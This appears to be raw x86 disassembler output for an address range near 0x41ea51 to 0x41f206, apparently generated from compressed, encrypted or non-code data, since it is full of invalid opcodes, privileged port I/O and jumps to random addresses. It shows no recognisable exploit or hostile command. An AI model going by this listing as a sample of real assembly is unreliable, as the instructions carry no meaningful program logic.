  41ea51:	icebp  
  41ea52:	jl     0x41ea76
  41ea54:	mov    edi,0x27aa3980
  41ea59:	icebp  
  41ea5a:	bound  ebp,QWORD PTR [ebx-0x6c]
  41ea5d:	pop    ds
  41ea5e:	cdq    
  41ea5f:	or     esp,DWORD PTR ds:0x8333fce8
  41ea65:	sub    DWORD PTR [ecx],esi
  41ea67:	sub    edi,DWORD PTR [edi]
  41ea69:	call   0x1acc7604
  41ea6e:	xor    eax,0x7b4215b1
  41ea73:	xchg   esp,eax
  41ea74:	sbb    ebx,esp
  41ea76:	ficomp DWORD PTR [edx+0x4d]
  41ea79:	pop    eax
  41ea7a:	fnstsw WORD PTR [ebp+0x6684c4df]
  41ea80:	push   edi
  41ea81:	inc    edx
  41ea82:	(bad)  
  41ea83:	popf   
  41ea84:	retf   
  41ea85:	fs (bad) 
  41ea87:	push   si
  41ea89:	jmp    0xf5bf52
	...
  41ea9a:	add    BYTE PTR [eax+0x23],dh
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax+0xfbcee1c]
  41eaa8:	add    ebx,DWORD PTR [ecx+0x23]
  41eaab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaac:	lea    eax,[ecx]
  41eaae:	add    BYTE PTR [edx-0xb000000],ch
  41eab4:	xchg   BYTE PTR [esp+ecx*4+0x2ec98f1f],bh
  41eabb:	cs sar edx,0x10
  41eabf:	in     eax,0x24
  41eac1:	and    esi,DWORD PTR [edx-0x34391a3f]
  41eac7:	and    cl,ch
  41eac9:	pop    DWORD PTR ds:0x2bb22ae8
  41eacf:	jg     0x41eb4e
  41ead1:	mov    ah,0xf4
  41ead3:	test   BYTE PTR [ebx-0x69],al
  41ead6:	data16 int3 
  41ead8:	aas    
  41ead9:	cdq    
  41eada:	rcl    DWORD PTR [esi],cl
  41eadc:	rcl    bl,cl
  41eade:	cwde   
  41eadf:	mov    edi,0xebbac738
  41eae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae5:	jnp    0x41eb65
  41eae7:	mov    ch,0xa6
  41eae9:	jl     0x41eb3c
  41eaeb:	add    eax,0xda311dc0
  41eaf0:	mov    bl,0xd7
  41eaf2:	idiv   BYTE PTR [esi-0x47]
  41eaf5:	mov    al,0xb8
  41eaf7:	sub    ecx,DWORD PTR [ecx+0x5db1637a]
  41eafd:	aaa    
  41eafe:	nop
  41eaff:	daa    
  41eb00:	sahf   
  41eb01:	mov    ebp,0xd72b9fb2
  41eb06:	pop    es
  41eb07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb08:	imul   ebx,DWORD PTR [edi-0xb66a438],0xffffffe9
  41eb0f:	adc    ch,dl
  41eb11:	jecxz  0x41ea96
  41eb13:	test   eax,0x2ae33e59
  41eb18:	(bad)  
  41eb19:	mov    al,0xdb
  41eb1b:	fbstp  TBYTE PTR [esi]
  41eb1d:	mov    eax,ds:0x34cdc0a3
  41eb22:	data16 aas 
  41eb24:	pop    esp
  41eb25:	mov    ss,esp
  41eb27:	loopne 0x41eaee
  41eb29:	sahf   
  41eb2a:	and    BYTE PTR ds:[eax],bl
  41eb2d:	popw   ds
  41eb2f:	out    dx,al
  41eb30:	sbb    BYTE PTR [ecx+edi*8],0xd5
  41eb34:	cwde   
  41eb35:	icebp  
  41eb36:	je     0x41eb60
  41eb38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb39:	shl    DWORD PTR [ebx],cl
  41eb3b:	imul   esi,DWORD PTR [ebx],0xd04e737a
  41eb41:	ja     0x41eb65
  41eb43:	sub    edi,ebx
  41eb45:	ja     0x41eb12
  41eb47:	fst    QWORD PTR [ecx+0x74d0a92e]
  41eb4d:	repnz pop ecx
  41eb4f:	sub    eax,0xe01109bb
  41eb54:	gs repnz imul ecx,ecx,0xffffffc4
  41eb59:	jg     0x41ebc1
  41eb5b:	cwde   
  41eb5c:	aas    
	...
  41eb69:	add    BYTE PTR [eax],al
  41eb6b:	xchg   esp,eax
  41eb6c:	nop
  41eb6d:	ffree  st(0)
  41eb6f:	(bad)  
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	inc    edx
  41eb79:	sub    eax,esi
  41eb7b:	push   ecx
  41eb7c:	mov    es,WORD PTR [ecx]
  41eb7e:	add    BYTE PTR [edx-0x10000000],ch
  41eb84:	xchg   edi,eax
  41eb85:	mov    al,0x86
  41eb87:	ja     0x41eb8b
  41eb89:	out    0x58,al
  41eb8b:	cmp    DWORD PTR [ecx],esp
  41eb8d:	cmp    al,0x71
  41eb8f:	retf   
  41eb90:	fsubr  st,st(1)
  41eb92:	jne    0x41ebb3
  41eb94:	mov    ebx,0x5e95ee10
  41eb99:	(bad)  
  41eb9a:	(bad)  
  41eb9b:	ja     0x41eb9a
  41eb9d:	in     eax,dx
  41eb9e:	(bad)  
  41eb9f:	mov    edi,0x3535affe
  41eba4:	inc    ecx
  41eba5:	jb     0x41eb2a
  41eba7:	xchg   DWORD PTR [ebx+0x7],esp
  41ebaa:	pop    esi
  41ebab:	loope  0x41ebb0
  41ebad:	faddp  st(3),st
  41ebaf:	jg     0x41eb77
  41ebb1:	(bad)  
  41ebb2:	neg    DWORD PTR [eax-0x73]
  41ebb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebb6:	mov    ah,BYTE PTR [ecx-0x20f4c3e6]
  41ebbc:	cli    
  41ebbd:	dec    esi
  41ebbe:	enter  0x6139,0xfa
  41ebc2:	mov    esi,edi
  41ebc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc5:	add    al,BYTE PTR [esi]
  41ebc7:	jb     0x41ec41
  41ebc9:	mov    WORD PTR [ecx+0x5e5df7e1],fs
  41ebcf:	sbb    esi,DWORD PTR [ebp-0x7846aff5]
  41ebd5:	cs mov edx,0xa6443a24
  41ebdb:	adc    al,0x41
  41ebdd:	and    edi,0x3d1696e9
  41ebe3:	cld    
  41ebe4:	push   ebp
  41ebe5:	pop    esp
  41ebe6:	add    ah,BYTE PTR [ebp+0x4f]
  41ebe9:	mov    ebx,0xbf15e1b4
  41ebee:	xor    al,0x51
  41ebf0:	pop    ss
  41ebf1:	fiadd  DWORD PTR [edx+0x4]
  41ebf4:	scas   eax,DWORD PTR es:[edi]
  41ebf5:	pop    ebx
  41ebf6:	ins    BYTE PTR es:[edi],dx
  41ebf7:	jecxz  0x41ebad
  41ebf9:	jmp    0x93c6b47a
  41ebfe:	ja     0x41ec25
  41ec00:	sar    cl,0x10
  41ec03:	mov    esp,0xb8172e85
  41ec08:	lahf   
  41ec09:	add    edx,0x6af62c15
  41ec0f:	lods   eax,DWORD PTR ds:[esi]
  41ec10:	out    0x91,eax
  41ec12:	add    BYTE PTR [eax],dh
  41ec14:	fmul   QWORD PTR [eax+ebp*1-0x6a]
  41ec18:	sbb    al,0x33
  41ec1a:	nop    DWORD PTR [edx+0x4330f3ed]
  41ec21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec22:	ss xor eax,0x14a669df
  41ec28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec29:	mov    al,ds:0x23b0cd
	...
  41ec3a:	add    ah,dh
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	sbb    eax,0xfb52503c
  41ec4c:	mov    es,WORD PTR [ecx]
  41ec4e:	add    BYTE PTR [edx-0x4000000],ch
  41ec54:	fstp   DWORD PTR [ecx-0x6466f71]
  41ec5a:	ja     0x41ec89
  41ec5c:	push   ds
  41ec5d:	sub    ch,BYTE PTR [eax+0x7f44ef66]
  41ec63:	jmp    0x1d19:0xa93f819c
  41ec6a:	sub    eax,0xef03c5d2
  41ec6f:	out    dx,eax
  41ec70:	dec    ebp
  41ec71:	and    cl,dh
  41ec73:	js     0x41ecb6
  41ec75:	lea    esi,[edi]
  41ec77:	sbb    cl,BYTE PTR [edi-0x70]
  41ec7a:	and    DWORD PTR [esp+ecx*4+0x1a821b3f],esi
  41ec81:	loopne 0x41ec30
  41ec83:	faddp  st(7),st
  41ec85:	test   al,0x97
  41ec87:	iret   
  41ec88:	cmc    
  41ec89:	inc    edx
  41ec8a:	nop
  41ec8b:	adc    ebp,DWORD PTR [ecx]
  41ec8d:	shl    BYTE PTR [edx],1
  41ec8f:	in     al,0xf5
  41ec91:	sub    eax,0x3a75c387
  41ec96:	jae    0x41ec50
  41ec98:	sbb    BYTE PTR [ecx],dl
  41ec9a:	ret    0xf9dc
  41ec9d:	jl     0x41ecaa
  41ec9f:	aaa    
  41eca0:	cwde   
  41eca1:	mov    ecx,0x8729b8fd
  41eca6:	ins    BYTE PTR es:[edi],dx
  41eca7:	mov    eax,0xb172f3c0
  41ecac:	std    
  41ecad:	sbb    al,0x62
  41ecaf:	pop    esp
  41ecb0:	pop    ecx
  41ecb1:	in     eax,dx
  41ecb2:	xor    DWORD PTR [ebx-0x681ae347],0x4d
  41ecb9:	and    al,0xa3
  41ecbb:	jo     0x41ec7e
  41ecbd:	outs   dx,BYTE PTR ds:[esi]
  41ecbe:	or     al,0xa6
  41ecc0:	lahf   
  41ecc1:	aaa    
  41ecc2:	cwde   
  41ecc3:	ins    BYTE PTR es:[edi],dx
  41ecc4:	jbe    0x41ecee
  41ecc6:	inc    DWORD PTR [ebx+0x50]
  41ecc9:	xchg   edi,eax
  41ecca:	jmp    0x41eca7
  41eccc:	push   ebp
  41eccd:	sbb    dh,BYTE PTR [esi]
  41eccf:	add    eax,0x9cbd4eb9
  41ecd4:	popa   
  41ecd5:	push   esp
  41ecd6:	outs   dx,DWORD PTR ds:[esi]
  41ecd7:	popa   
  41ecd8:	push   edx
  41ecd9:	fadd   DWORD PTR [ebp-0x6151d319]
  41ecdf:	mov    ecx,0xc3f820ec
  41ece4:	cdq    
  41ece5:	xchg   ebx,eax
  41ece6:	retf   
  41ece7:	push   eax
  41ece8:	(bad)  
  41ece9:	lea    ebp,[ecx-0x2d62a16b]
  41ecef:	mov    esp,0x9d5ff607
  41ecf4:	sub    ecx,DWORD PTR ds:0xfe905309
  41ecfa:	adc    edi,DWORD PTR [ebx]
  41ecfc:	repnz add BYTE PTR [eax],al
	...
  41ed0b:	xor    dl,bl
  41ed0d:	into   
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	mov    edi,0xa5e41f76
  41ed1c:	pop    DWORD PTR [ecx]
  41ed1e:	add    BYTE PTR [edx-0xb000000],ch
  41ed24:	loop   0x41ecfc
  41ed26:	cmp    BYTE PTR [ecx+0x35],0x16
  41ed2a:	jne    0x41ed99
  41ed2c:	pop    ecx
  41ed2d:	xchg   edx,eax
  41ed2e:	jae    0x41ed16
  41ed30:	push   ax
  41ed32:	jno    0x41ecda
  41ed34:	pusha  
  41ed35:	sub    al,0xc3
  41ed37:	loopne 0x41ecbc
  41ed39:	xchg   ebp,eax
  41ed3a:	gs je  0x41ece0
  41ed3d:	icebp  
  41ed3e:	or     eax,0xce3e0765
  41ed43:	xchg   ebp,eax
  41ed44:	add    bl,BYTE PTR [ecx+0x2f]
  41ed47:	popf   
  41ed48:	inc    edi
  41ed49:	stc    
  41ed4a:	mov    es,ebp
  41ed4c:	leavew 
  41ed4e:	loope  0x41ece1
  41ed50:	xchg   ebp,eax
  41ed51:	push   edx
  41ed52:	lods   al,BYTE PTR ds:[esi]
  41ed53:	(bad)  
  41ed54:	pop    eax
  41ed55:	cs cwde 
  41ed57:	inc    ebp
  41ed58:	xchg   ebp,eax
  41ed59:	mov    edx,0xc712e73d
  41ed5e:	or     BYTE PTR [edx+0x71],al
  41ed61:	mov    bl,0x70
  41ed63:	sub    al,0x74
  41ed65:	mov    ecx,0x8f8f99da
  41ed6b:	aad    0x7c
  41ed6d:	stos   DWORD PTR es:[edi],eax
  41ed6e:	dec    eax
  41ed6f:	sbb    DWORD PTR [eax+0x42],ebp
  41ed72:	fnstcw WORD PTR [edx-0x6d76e5f9]
  41ed78:	gs (bad) 
  41ed7a:	retf   0x6d77
  41ed7d:	adc    DWORD PTR [ebp-0x7e0ee],ebp
  41ed83:	and    al,ah
  41ed85:	sbb    al,0x77
  41ed87:	sti    
  41ed88:	ret    
  41ed89:	call   0xae49:0xb0cd76d7
  41ed90:	push   esi
  41ed91:	dec    ebx
  41ed92:	mov    dh,0xc4
  41ed94:	test   eax,0xda2ccc86
  41ed99:	cwde   
  41ed9a:	jb     0x41ed7e
  41ed9c:	xlat   BYTE PTR ds:[ebx]
  41ed9d:	mov    ebx,ebx
  41ed9f:	stos   BYTE PTR es:[edi],al
  41eda0:	push   edi
  41eda1:	sti    
  41eda2:	enter  0x6066,0xac
  41eda6:	mov    cs,WORD PTR [ebx]
  41eda8:	and    bl,ah
  41edaa:	mov    bh,0xa5
  41edac:	popf   
  41edad:	jae    0x41ede3
  41edaf:	nop
  41edb0:	not    BYTE PTR [ecx+0x53]
  41edb3:	adc    BYTE PTR [ebp-0x393d4f49],al
  41edb9:	mov    fs,WORD PTR [edi+edi*4]
  41edbc:	ins    DWORD PTR es:[edi],dx
  41edbd:	dec    ecx
  41edbe:	mov    eax,ds:0x1e149cf0
  41edc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edc4:	and    eax,0x4ae6a753
  41edc9:	mov    ds:0x94e509,eax
	...
  41edda:	add    bl,bl
  41eddc:	in     eax,dx
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp-0x69fcc292],ecx
  41edeb:	dec    edi
  41edec:	nop
  41eded:	add    DWORD PTR [eax],eax
  41edef:	stos   BYTE PTR es:[edi],al
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    BYTE PTR [edx],cl
  41edf4:	push   ebp
  41edf5:	jg     0x41edfd
  41edf7:	outs   dx,DWORD PTR ds:[esi]
  41edf8:	sti    
  41edf9:	ficom  DWORD PTR [esi-0x178577b1]
  41edff:	dec    edi
  41ee00:	push   ebp
  41ee01:	test   DWORD PTR [edi+0x659dc000],edi
  41ee07:	mov    ds:0x46d5a859,eax
  41ee0c:	fstp   DWORD PTR [eax+eiz*2]
  41ee0f:	cmc    
  41ee10:	jne    0x41ee3c
  41ee12:	(bad)  
  41ee13:	dec    ecx
  41ee14:	inc    ecx
  41ee15:	int3   
  41ee16:	cmp    edi,DWORD PTR ds:0xffc98519
  41ee1c:	dec    ecx
  41ee1d:	mov    ds:0x45f74abf,eax
  41ee22:	rol    BYTE PTR ds:0xcdf317cb,0xd0
  41ee29:	or     eax,0x920b3214
  41ee2e:	shl    DWORD PTR [ecx],1
  41ee30:	cmp    eax,0x25340597
  41ee35:	xor    DWORD PTR [esi+0x12],esp
  41ee38:	or     ebp,DWORD PTR [edx]
  41ee3a:	xchg   edi,eax
  41ee3b:	xor    eax,0x1b209bcc
  41ee40:	add    ebx,DWORD PTR [ebx-0x17]
  41ee43:	sbb    esp,DWORD PTR [ecx+0x5c8cb5c0]
  41ee49:	xchg   ecx,eax
  41ee4a:	xor    edi,DWORD PTR ds:0x59d93744
  41ee50:	sbb    ecx,ebx
  41ee52:	in     eax,0xb8
  41ee54:	aad    0x71
  41ee56:	ds ins BYTE PTR es:[edi],dx
  41ee58:	pop    ebp
  41ee59:	fwait
  41ee5a:	lds    esp,FWORD PTR [edi]
  41ee5c:	stos   BYTE PTR es:[edi],al
  41ee5d:	dec    esp
  41ee5e:	clc    
  41ee5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee60:	out    0x22,eax
  41ee62:	push   es
  41ee63:	pop    esi
  41ee64:	dec    eax
  41ee65:	or     DWORD PTR ds:0xc47dfdae,eax
  41ee6b:	pop    eax
  41ee6c:	ficomp DWORD PTR [eax+0x6629d293]
  41ee72:	or     esi,DWORD PTR [esi]
  41ee74:	int3   
  41ee75:	dec    ebx
  41ee76:	imul   ebp,ebp,0x62cca644
  41ee7c:	sti    
  41ee7d:	(bad)  
  41ee7e:	jl     0x41ee55
  41ee80:	les    ebp,FWORD PTR [esp+ebx*2+0xf]
  41ee84:	rcr    BYTE PTR [edi+eax*8],0x5c
  41ee88:	adc    eax,0x3db03dba
  41ee8d:	adc    eax,DWORD PTR [edx+0x661921be]
  41ee93:	cmp    DWORD PTR [edi+0x3d],0xd2bf47fd
  41ee9a:	std    
  41ee9b:	ja     0x41ee81
	...
  41eea9:	add    BYTE PTR [eax],al
  41eeab:	add    eax,0x6f976b22
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi-0x2cf7be96],ah
  41eeba:	jl     0x41eeb5
  41eebc:	nop
  41eebd:	add    DWORD PTR [eax],eax
  41eebf:	stos   BYTE PTR es:[edi],al
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    BYTE PTR [ecx-0x386bb5f1],bl
  41eec8:	or     edx,DWORD PTR [edi]
  41eeca:	xor    eax,0xb5c9c2b1
  41eecf:	gs xor al,0x0
  41eed2:	ret    
  41eed3:	div    DWORD PTR ds:0xfbd079a0
  41eed9:	out    0x23,eax
  41eedb:	cmp    eax,0x746e3b4e
  41eee0:	aaa    
  41eee1:	out    0xe,eax
  41eee3:	xchg   ebp,eax
  41eee4:	iret   
  41eee5:	inc    edi
  41eee6:	arpl   WORD PTR [eax-0x7feca423],ax
  41eeec:	sbb    eax,0xe9155246
  41eef1:	in     al,0xce
  41eef3:	sbb    eax,0x3503b0a9
  41eef8:	dec    edi
  41eef9:	cmp    eax,DWORD PTR [eax-0x606f4d7d]
  41eeff:	mov    ds:0x6ffda23,al
  41ef04:	inc    edi
  41ef05:	dec    eax
  41ef06:	xor    DWORD PTR [eax+eiz*2],eax
  41ef09:	add    edi,DWORD PTR [edx]
  41ef0b:	inc    ebp
  41ef0c:	pop    esi
  41ef0d:	mov    esp,0xaf42bfde
  41ef12:	inc    esi
  41ef13:	push   ebp
  41ef14:	int    0x33
  41ef16:	jo     0x41ef7b
  41ef18:	call   0x50dc12fa
  41ef1d:	cmc    
  41ef1e:	adc    DWORD PTR [eax],ebp
  41ef20:	popf   
  41ef21:	sub    DWORD PTR [ecx+eiz*2+0x74],0x1e
  41ef26:	(bad)  
  41ef28:	mov    ds:0x51228e3d,al
  41ef2d:	shl    DWORD PTR [esi-0x646f8793],0x62
  41ef34:	fldenv [edx]
  41ef36:	mov    DWORD PTR [eax],ecx
  41ef38:	test   DWORD PTR [edx],edx
  41ef3a:	dec    esi
  41ef3b:	mov    edi,0x62ce9cb2
  41ef40:	mov    esi,cs
  41ef42:	loope  0x41ef3b
  41ef44:	int    0x64
  41ef46:	outs   dx,BYTE PTR ds:[esi]
  41ef47:	ficom  DWORD PTR fs:[esi-0x4b]
  41ef4b:	out    0x43,al
  41ef4d:	xchg   BYTE PTR [ebp+0x5396e5dc],ch
  41ef53:	dec    eax
  41ef54:	cmp    ecx,edx
  41ef56:	fcom   st(4)
  41ef58:	jmp    0xcb93:0x4e3623ac
  41ef5f:	mov    bl,0x12
  41ef61:	pop    es
  41ef62:	pop    es
  41ef63:	and    al,al
  41ef65:	cwde   
  41ef66:	ret    0xc8a9
  41ef69:	ds in  al,dx
  41ef6b:	lds    eax,FWORD PTR [esi+0x0]
	...
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	icebp  
  41ef88:	and    DWORD PTR [ecx-0x3e],edi
  41ef8b:	mov    ds:0xaa000191,eax
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    BYTE PTR [edx-0x1d19dd6b],dl
  41ef98:	xchg   BYTE PTR [esi],dl
  41ef9a:	adc    eax,0xe02412f8
  41ef9f:	pop    es
  41efa0:	sbb    eax,DWORD PTR [ecx+0x52]
  41efa3:	popa   
  41efa4:	daa    
  41efa5:	pushf  
  41efa6:	lds    ecx,FWORD PTR [edi-0x18047bbf]
  41efac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efad:	or     al,0xb0
  41efaf:	ins    DWORD PTR es:[edi],dx
  41efb0:	outs   dx,DWORD PTR ds:[esi]
  41efb1:	pop    edi
  41efb2:	stc    
  41efb3:	xor    BYTE PTR [edx-0x10],ah
  41efb6:	fld    DWORD PTR [eax-0x159ddb13]
  41efbc:	mov    WORD PTR [eax+0x2a37d5c4],ss
  41efc2:	xchg   DWORD PTR [edx+0x2ce901b9],eax
  41efc8:	jmp    0xc9c57c35
  41efcd:	add    ecx,DWORD PTR [edi]
  41efcf:	xchg   DWORD PTR [esi+0x21],edx
  41efd2:	retf   
  41efd3:	icebp  
  41efd4:	test   BYTE PTR [ebp-0x48],al
  41efd7:	(bad)  
  41efd8:	shl    esp,cl
  41efda:	jg     0x41eff5
  41efdc:	or     eax,0xf781fa48
  41efe1:	sbb    al,0x8e
  41efe3:	mov    ebx,0x818a30ea
  41efe8:	xchg   esi,eax
  41efe9:	iret   
  41efea:	test   dl,al
  41efec:	add    eax,0xa2b6885c
  41eff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eff2:	push   edx
  41eff3:	cdq    
  41eff4:	enter  0x6fd8,0x59
  41eff8:	mov    dl,0x8
  41effa:	push   0xffffffa7
  41effc:	jge    0x41ef93
  41effe:	sub    eax,0x5d1ee1f2
  41f003:	mov    ebp,0x12cf6345
  41f008:	or     al,0x8d
  41f00a:	hlt    
  41f00b:	jne    0x41ef91
  41f00d:	push   edi
  41f00e:	dec    edx
  41f00f:	inc    ecx
  41f010:	mov    ecx,0xabe1c21
  41f015:	pusha  
  41f016:	aad    0x58
  41f018:	push   esi
  41f019:	or     ah,BYTE PTR [ecx]
  41f01b:	dec    esi
  41f01c:	mov    ah,0xb7
  41f01e:	push   esi
  41f01f:	adc    BYTE PTR [edx],0xed
  41f022:	lods   al,BYTE PTR ds:[esi]
  41f023:	stos   DWORD PTR es:[edi],eax
  41f024:	repz inc ebp
  41f026:	xor    al,0xa8
  41f028:	(bad)  
  41f029:	lods   al,BYTE PTR ds:[esi]
  41f02a:	test   DWORD PTR [ecx+0x3776d31f],ebx
  41f030:	int    0x79
  41f032:	clc    
  41f033:	add    al,0xbb
  41f035:	aas    
  41f036:	aad    0x44
  41f038:	cmp    al,0xac
  41f03a:	push   ebp
  41f03b:	sbb    al,0xef
	...
  41f049:	add    BYTE PTR [eax],al
  41f04b:	fisubr WORD PTR [ecx]
  41f04d:	cwde   
  41f04e:	sar    bh,cl
  41f050:	repz fisubr WORD PTR ds:0x4af35f6
  41f057:	xchg   ecx,eax
  41f058:	ja     0x41efea
  41f05a:	lods   al,BYTE PTR ds:[esi]
  41f05b:	dec    ebp
  41f05c:	xchg   edx,eax
  41f05d:	add    DWORD PTR [eax],eax
  41f05f:	stos   BYTE PTR es:[edi],al
  41f060:	add    BYTE PTR [eax],al
  41f062:	add    BYTE PTR [edx+eiz*8],dl
  41f065:	into   
  41f066:	fst    DWORD PTR [eax]
  41f068:	xor    cl,BYTE PTR [ecx+0x456eeb4]
  41f06e:	xor    ch,BYTE PTR [eax+0x7f64d7f0]
  41f074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f075:	dec    ebp
  41f076:	mov    es,WORD PTR ds:0xe89cbb4d
  41f07c:	fdiv   DWORD PTR [esi]
  41f07e:	sub    eax,0xa99fdfd7
  41f083:	xchg   edi,eax
  41f084:	sahf   
  41f085:	push   es
  41f086:	adc    BYTE PTR [ebp+0x8],bl
  41f089:	loope  0x41f038
  41f08b:	mov    al,0xee
  41f08d:	in     al,0x6b
  41f08f:	test   al,0x22
  41f091:	jecxz  0x41f022
  41f093:	outs   dx,BYTE PTR ds:[esi]
  41f094:	fild   DWORD PTR [edi+0x27b803c5]
  41f09a:	fwait
  41f09b:	push   ecx
  41f09c:	xor    eax,0x2a6eab06
  41f0a1:	jle    0x41f0be
  41f0a3:	je     0x41f039
  41f0a5:	push   ss
  41f0a6:	in     eax,dx
  41f0a7:	mov    esp,0xd34a9904
  41f0ac:	or     dh,BYTE PTR [ebx+0x32]
  41f0af:	ss jmp 0xf2e8a2c9
  41f0b5:	inc    ebp
  41f0b6:	mov    WORD PTR [esi],cs
  41f0b8:	push   0xe888c4f1
  41f0bd:	imul   edi,DWORD PTR [eax-0x6f5a1f3b],0x1c
  41f0c4:	push   ds
  41f0c5:	push   esp
  41f0c6:	cmp    ebp,DWORD PTR [edi-0x6e987c60]
  41f0cc:	sbb    BYTE PTR [edx],0x7f
  41f0cf:	jnp    0x41f07b
  41f0d1:	xor    BYTE PTR [eax-0xe],bl
  41f0d4:	in     al,dx
  41f0d5:	stc    
  41f0d6:	and    DWORD PTR [edx],edi
  41f0d8:	sub    edx,DWORD PTR [ebx+0x3a48cc54]
  41f0de:	dec    edx
  41f0df:	sub    al,0x5f
  41f0e1:	popf   
  41f0e2:	cvtps2pd xmm4,QWORD PTR [edi]
  41f0e5:	cmc    
  41f0e6:	xor    eax,0xdb697929
  41f0eb:	cdq    
  41f0ec:	dec    DWORD PTR [ebx+0x13a17a75]
  41f0f2:	inc    ebp
  41f0f3:	nop
  41f0f4:	sub    DWORD PTR [esi+0x1f],edi
  41f0f7:	push   0x9cdb0667
  41f0fc:	push   eax
  41f0fd:	pop    ecx
  41f0fe:	out    0xda,al
  41f100:	xchg   BYTE PTR [ecx-0x2bdd8b06],bl
  41f106:	add    BYTE PTR [ecx+0x32],bl
  41f109:	jg     0x41f08d
  41f10b:	push   esi
  41f10c:	cmc    
	...
  41f119:	add    BYTE PTR [eax],al
  41f11b:	dec    esi
  41f11c:	aas    
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	outs   dx,BYTE PTR ds:[esi]
  41f128:	xchg   ebp,eax
  41f129:	ds xor eax,0x192f7
  41f12f:	stos   BYTE PTR es:[edi],al
  41f130:	add    BYTE PTR [eax],al
  41f132:	add    bl,al
  41f134:	pusha  
  41f135:	sbb    BYTE PTR [edx],bl
  41f137:	cmp    ch,BYTE PTR [esi+0x7502f314]
  41f13d:	ds cmp al,0x5
  41f140:	add    ebx,edi
  41f142:	add    al,0x46
  41f144:	inc    edx
  41f145:	mov    bl,BYTE PTR [ecx+0x13b5808d]
  41f14b:	and    al,0x92
  41f14d:	add    eax,0x1d5fec15
  41f152:	stc    
  41f153:	xor    ah,BYTE PTR gs:[ecx-0x4d]
  41f157:	clc    
  41f158:	out    0xf0,eax
  41f15a:	mov    dh,0xde
  41f15c:	mov    esp,0x91e4ce33
  41f161:	mov    ah,0xfe
  41f163:	and    BYTE PTR [edi-0x22beb1a0],ch
  41f169:	cwde   
  41f16a:	test   al,0x42
  41f16c:	stos   BYTE PTR es:[edi],al
  41f16d:	jg     0x41f1c8
  41f16f:	pop    ds
  41f170:	out    0x5e,eax
  41f172:	jg     0x41f1da
  41f174:	shr    DWORD PTR [edi],cl
  41f176:	or     bl,bh
  41f178:	add    esi,DWORD PTR [ecx]
  41f17a:	dec    edx
  41f17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f17c:	mov    dl,BYTE PTR [ebp+0x1ab8cef4]
  41f182:	call   0x9d62e09
  41f187:	std    
  41f188:	cmp    BYTE PTR [edx],0xb1
  41f18b:	ins    BYTE PTR es:[edi],dx
  41f18c:	gs jae 0x41f144
  41f18f:	jmp    0x7102fd28
  41f194:	dec    ebx
  41f195:	mov    edx,0xdbaf516f
  41f19a:	in     eax,dx
  41f19b:	push   ecx
  41f19c:	test   al,0x65
  41f19e:	pop    esp
  41f19f:	sub    DWORD PTR [eax+0x65],esp
  41f1a2:	adc    al,0xb
  41f1a4:	jo     0x41f1a1
  41f1a6:	inc    esi
  41f1a7:	xchg   edx,eax
  41f1a8:	les    ebp,FWORD PTR [ecx+0x353aa3f8]
  41f1ae:	shl    DWORD PTR [esi-0x3cddc5fc],cl
  41f1b4:	cmp    al,0x56
  41f1b6:	adc    dl,ch
  41f1b8:	je     0x41f1e4
  41f1ba:	jmp    0x41f194
  41f1bc:	loope  0x41f1ec
  41f1be:	pop    ds
  41f1bf:	adc    ch,BYTE PTR [ebx+0x2d]
  41f1c2:	mov    ds:0xe774334,eax
  41f1c7:	sahf   
  41f1c8:	sbb    DWORD PTR [ebx],esp
  41f1ca:	out    0x63,eax
  41f1cc:	outs   dx,BYTE PTR ds:[esi]
  41f1cd:	icebp  
  41f1ce:	les    esi,FWORD PTR [esi+0x234bbbdd]
  41f1d4:	in     eax,dx
  41f1d5:	std    
  41f1d6:	ja     0x41f1dc
  41f1d8:	lods   al,BYTE PTR ds:[esi]
  41f1d9:	mov    ecx,0xa32445
	...
  41f1ea:	add    BYTE PTR [esi],bl
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	fnstsw WORD PTR [eax]
  41f1f9:	sti    
  41f1fa:	pop    eax
  41f1fb:	mov    eax,ds:0xaa000193
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    bl,bh
  41f204:	adc    bh,dl
  41f206:	xchg   ecx,eax
